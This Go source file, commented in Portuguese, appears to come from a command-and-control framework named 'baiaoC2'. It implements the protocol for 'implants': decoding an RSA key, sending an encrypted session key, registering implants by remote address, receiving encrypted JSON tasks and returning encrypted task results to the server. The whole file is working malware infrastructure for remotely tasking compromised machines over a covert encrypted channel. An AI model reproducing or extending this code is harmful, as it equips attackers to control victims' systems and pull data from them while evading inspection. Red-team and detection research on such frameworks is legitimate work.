package protocol

import (
	"crypto/rsa"
	"crypto/x509"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"encoding/pem"
	"errors"
	"log"
	"net"
	"baiaoC2/shared/crypto"
)

// Definição das estruturas para comunicação
type Task struct {
	Type int
	Code int
	Data []byte
}

type TaskResult struct {
	Success bool
	Output  string
}

type Implant struct {
	ID         string
	SessionKey []byte
	Conn       net.Conn
}

// Função para converter string Base64/PEM em *rsa.PublicKey
func decodePublicKey(pubKeyStr string) (*rsa.PublicKey, error) {
	decodedKey, err := base64.StdEncoding.DecodeString(pubKeyStr)
	if err != nil {
		return nil, err
	}

	block, _ := pem.Decode(decodedKey)
	if block == nil {
		return nil, errors.New("Falha ao decodificar chave PEM")
	}

	pub, err := x509.ParsePKCS1PublicKey(block.Bytes)
	if err != nil {
		return nil, err
	}

	return pub, nil
}

// Enviar chave de sessão para o implante
func SendSessionKey(conn net.Conn, sessionKey []byte, serverKey string) error {
	// Converter `serverKey` de string para `*rsa.PublicKey`
	pubKey, err := decodePublicKey(serverKey)
	if err != nil {
		log.Printf("Erro ao decodificar chave pública: %v", err)
		return err
	}

	// Criptografar a chave de sessão com a chave pública do servidor
	encryptedKey, err := crypto.EncryptWithPublicKey(sessionKey, pubKey)
	if err != nil {
		log.Printf("Erro ao criptografar chave de sessão: %v", err)
		return err
	}

	// Enviar o tamanho da chave criptografada primeiro
	keySize := uint32(len(encryptedKey))
	if err := binary.Write(conn, binary.LittleEndian, keySize); err != nil {
		log.Printf("Erro ao enviar tamanho da chave: %v", err)
		return err
	}

	// Enviar a chave criptografada
	if _, err := conn.Write(encryptedKey); err != nil {
		log.Printf("Erro ao enviar chave criptografada: %v", err)
		return err
	}

	return nil
}

// Registrar implante e manter referência para comunicação
func RegisterImplant(conn net.Conn, sessionKey []byte) *Implant {
	id := conn.RemoteAddr().String()
	log.Printf("[+] Implante registrado com ID: %s", id)

	return &Implant{
		ID:         id,
		SessionKey: sessionKey,
		Conn:       conn,
	}
}

// Receber tarefa do servidor
func ReceiveTask(conn net.Conn, sessionKey []byte) (Task, error) {
	var task Task
	var taskSize uint32

	// Ler o tamanho da mensagem
	if err := binary.Read(conn, binary.LittleEndian, &taskSize); err != nil {
		return task, err
	}

	// Ler a mensagem criptografada
	encryptedTask := make([]byte, taskSize)
	if _, err := conn.Read(encryptedTask); err != nil {
		return task, err
	}

	// Descriptografar a mensagem
	taskData, err := crypto.Decrypt(encryptedTask, sessionKey)
	if err != nil {
		return task, err
	}

	// Decodificar JSON
	if err := json.Unmarshal(taskData, &task); err != nil {
		return task, err
	}

	return task, nil
}

// Enviar o resultado da tarefa para o servidor
func SendTaskResult(conn net.Conn, result TaskResult, sessionKey []byte) error {
	resultData, err := json.Marshal(result)
	if err != nil {
		return err
	}

	// Criptografar os dados antes de enviar
	encryptedResult, err := crypto.Encrypt(resultData, sessionKey)
	if err != nil {
		return err
	}

	// Enviar o tamanho da mensagem
	resultSize := uint32(len(encryptedResult))
	if err := binary.Write(conn, binary.LittleEndian, resultSize); err != nil {
		return err
	}

	// Enviar os dados criptografados
	if _, err := conn.Write(encryptedResult); err != nil {
		return err
	}

	return nil
}
